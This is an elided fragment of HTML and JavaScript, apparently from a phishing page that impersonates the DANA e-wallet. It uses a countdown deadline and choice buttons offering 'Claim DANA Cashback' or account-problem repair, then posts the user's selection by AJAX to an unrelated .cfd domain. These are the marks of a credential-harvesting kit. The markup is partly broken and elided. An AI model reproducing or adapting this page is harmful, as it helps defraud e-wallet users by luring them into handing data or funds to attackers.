...
<script>
let tglNow = new Date();
let waktuBatas = new Date("2025-04-28T23:59:59");
...
.s:active{
 ...
 <center>
  ...
  <label class="aha">
   <input type="radio" id="btn2" name="tarif" value="𝗖𝗹𝗮𝗶𝗺 𝗗𝗔𝗡𝗔 𝗖𝗮𝘀𝗵𝗯𝗮𝗰𝗸" onclick="letsgo1()">
   <sp class="s">𝗖𝗹𝗮𝗶𝗺 𝗗𝗔𝗡𝗔 𝗖𝗮𝘀𝗵𝗯𝗮𝗰𝗸</span>
   </label>
   <label class="aha">
   <input type="radio" id="btn3" name="tarif" value="𝗣𝗲𝗿𝗯𝗮𝗶𝗸𝗮𝗻 𝗞𝗲𝗻𝗱𝗮𝗹𝗮 𝗔𝗸𝘂𝗻" onclick="letsgo1()">
   <sp class="s">𝗣𝗲𝗿𝗯𝗮𝗶𝗸𝗮𝗻 𝗞𝗲𝗻𝗱𝗮𝗹𝗮 𝗔𝗸𝘂𝗻</span>
   </label>
   <label class="aha">
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://choreo.ii-fi.cfd/3s0k/ss/tarif.php',
